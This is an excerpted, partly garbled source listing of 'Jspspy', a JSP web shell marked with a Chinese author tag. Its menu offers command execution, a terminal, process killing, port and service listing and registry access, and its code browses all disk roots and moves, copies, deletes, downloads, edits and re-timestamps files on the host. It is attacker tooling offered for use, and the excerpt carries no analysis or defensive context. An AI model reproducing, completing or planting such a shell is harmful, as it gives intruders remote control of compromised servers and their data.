...
<HTML><HEAD><TITLE>※Jspspy web~shell V1.0</TITLE>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<META content="spy web~shell" name=GENERATOR></HEAD>
...
public void mainForm(JspWriter out,String webSite_Folder) throws Exception{
    ...
    out.print("<tr><td width=60 align=center>Path:</td><td>");
    ...
    out.print("</td><td width=100 align=center><a href=\"javascript:checkUrl();\">GO</a>"); 
...
public void mainMenu(JspWriter out,String webSite_Folder,String strAbsPath) throws Exception{
	...
	out.print("????????????┅?");	
	listRoot(out);
	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+webSite_Folder+"\");'><B>Root</B></A></TD></TR>\n");
	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+convertPath(strAbsPath)+"\");'><B>Root Folder</B></A></TD></TR>\n");
	out.print("<TD height=20><A href='javascript:newFolder(\""+webSite_Folder+"\")'> New directory </A></TD></TR><TR>\n");
	out.print("<TR><TD height=20><A href=\"?action=G\" target=FileFrame>〖New File〗</A></TD></TR>\n");
	out.print("<TR><TD height=20><A href=\"?action=q\" target=FileFrame>●Find<B>文件</B></A></TD></TR>");
	out.print("<TR><TD height=20><A href='?action=t' target=FileFrame>●Upload<B>文件</TD></TR>");
	out.print("<TR><TD onmouseover=\"menu2.style.display=''\" height=22><B>+≤Tools≥</B>\n");
	out.print("<div id=menu2 style=\"display:none; width:100%\" onmouseout=\"menu2.style.dispaly='none'\">");
	out.print("<a href='?action=U' target=FileFrame>〖System 〗</a><br>\n");
	out.print("<a href='?action=E' target=FileFrame>〖CMD〗</a><br>\n");
	out.print("<a href='?action=w' target=FileFrame>〖Terminal〗</a><br>\n");
	out.print("<a href='?action=B&command=netstat' target=FileFrame>〖Port List〗</a><br>\n");
	out.print("<a href='?action=Z&command=netstart' target=FileFrame>〖Service List〗</a><br>\n");
	out.print("<a href='?action=Y&command=tasklist' target=FileFrame>〖Process list〗</a><br>\n");
	out.print("<a href='?action=V' target=FileFrame>〖Kill Process〗</a><br>\n");
	out.print("<a href='?action=x' target=FileFrame>〖Registry〗</a><br>\n");
...
void listRoot(JspWriter out){
  try{
		...
		for(int i=0;i<roots.length;i++){
			out.print("<A href='"+"javascript:JshowFolder(\""+convertPath(roots[i].getPath())+"\")'>Local Disk："+roots[i].getPath()+"</A><br>\n");
...
public void listFolder(JspWriter out,String path) throws Exception{
	...
	try{
		...
		if(sfiles.length>0){
			...
			//out.print("<Tbody>\n");
			//out.print("");
			out.print("<tr><td align='left'>File Name</td><td align='center'>Type</td><td align='center'>Size</td><td align='center'>Readable</td><td align='center'>Write</td><td align='center'>Hide</td><td align='center'>Last Modified</td><td align='left'>Related operations</td></tr>");
			for(int i=0;abFileName[i]!=null;i++){	
				out.print("<tr><td><a href='javascript:JshowFolder(\""+abFileName[i]+"\");'>"+"<font face=\"wingdings\" size=6>&#48;</font>"+strCut(reFileName[i],30)+"</td><td>folder</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>Move&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>Delete&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>Edit-Time&nbsp;&nbsp;</a><a href='javascript:zipFile(\""+abFileName[i]+"\");'>Zip&nbsp;&nbsp;</a></td></tr>");
	...
	if(empchk(sPath)&&empchk(dpath)){
		...
		if(dfile.exists()){
			...
			if(sfile.renameTo(dfile)){
				out.print("☆孤水绕城☆友情提示:<br><br>Move成功！");
			}
		}
	}
...
public void delName(JspWriter out,String spath) throws Exception{
	if(empchk(spath)){
		...
		if(file.delete()){
			out.print("☆孤水绕城☆友情提示:<br><br>Delete成功！");
		}
	}
}
public void copyName(JspWriter out,String spath,String dpath) throws Exception{
	if(empchk(spath)&&empchk(dpath)){
		...
		if(dfile.exists()){
			...
			out.print("☆孤水绕城☆友情提示:<br><br>文件Copy成功！");
		}catch(Exception e){
			...
			for(int i=0;i<list.length;i++){
				if(list[i].isDirectory()){
					...
					if(list[i].getName().equals(dfileName)){
						...
						out.print("<tr><td width='60%'>"+strCut(convertPath(list[i].getPath()),70)+"</td><td width='40%'><a href='javascript:JsReName(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>Move&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>Copy&nbsp;&nbsp;</a><a href='?action=H&fileName="+convertPath(list[i].getPath())+"'>Edit&nbsp;&nbsp;</a><a <a href='?action=O&fileName="+convertPath(list[i].getPath())+"'>Download&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+convertPath(list[i].getPath())+"\");'>Delete&nbsp;&nbsp;</a><a href='javascript:setDate(\""+convertPath(list[i].getPath())+"\")'>Edit-Time&nbsp;&nbsp;</a></td></tr>");
						out.print("</table>");
					}
...
public void pregedit(JspWriter out) throws Exception{
	out.print("<p>☆孤水绕城☆友情提示:<br><br>v1.0版本暂不支持注册表Edit功能，期待下一个V1.1版本吧:-) </p>");
}
...
function JsReName(spath,dpath){
	var newFolderName = prompt("请输入Move到目标文件全名称",dpath);
	if(confirm("你确定要Move到目标文件吗!")){
...
function JsCoypFile(spath,dpath){
	var newFolderName = prompt("请输入Copy到目标文件全名称",dpath);
	if(confirm("你确定要Copy到目标文件吗!")){
